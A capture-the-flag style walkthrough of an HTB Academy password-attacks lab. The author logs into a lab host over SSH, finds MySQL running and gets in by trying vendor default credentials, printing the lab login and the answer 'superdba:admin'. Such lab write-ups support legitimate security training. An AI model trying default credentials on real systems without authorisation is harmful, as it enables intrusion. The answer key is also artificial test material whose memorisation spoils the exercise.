### CPTS / HTB Penetration Tester Path <br>
### Password Attacks - Spraying, Stuffing, and Defaults <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

SSH to 10.129.27.129 (ACADEMY-PWATTACKS-NIX01) with user "sam" and password "B@tm@n2022!"

IP: 10.129.27.129

---

### Question 1:
Use the credentials provided to log into the target machine and retrieve the MySQL credentials. Submit them as the answer. (Format: username:password)

SSH in:
```diff
+ $ ssh sam@10.129.27.129
```

	sam@nix01:~$

The question mentions mysql, and indeed we can see its running with:
```diff
+ sam@nix01:~/Documents$ ps aux | grep mysql
```

	mysql        942  0.2 19.0 2111140 386072 ?      Ssl  04:04   0:09 /usr/sbin/mysqld
	sam         3017  0.0  0.0   6432   672 pts/0    S+   05:10   0:00 grep --color=auto mysql

We will need a password to login, lets look through the provided default password list and try the MySQL combos:

	MySQL,admin@example.com,admin
	MySQL,root,<blank>
	MySQL (ssh),root,root
	MySQL,superdba,admin

Trying the last one got us in:
```diff
+ sam@nix01:~$ mysql --user=superdba --password=admin
```

	mysql: [Warning] Using a password on the command line interface can be insecure.
	Welcome to the MySQL monitor.  Commands end with ; or \g.
	Your MySQL connection id is 15
	Server version: 8.0.28-0ubuntu0.20.04.3 (Ubuntu)
	
	Copyright (c) 2000, 2022, Oracle and/or its affiliates.
	
	Oracle is a registered trademark of Oracle Corporation and/or its
	affiliates. Other names may be trademarks of their respective
	owners.
	
	Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
	
	mysql>

🚩 found **superdba:admin**.
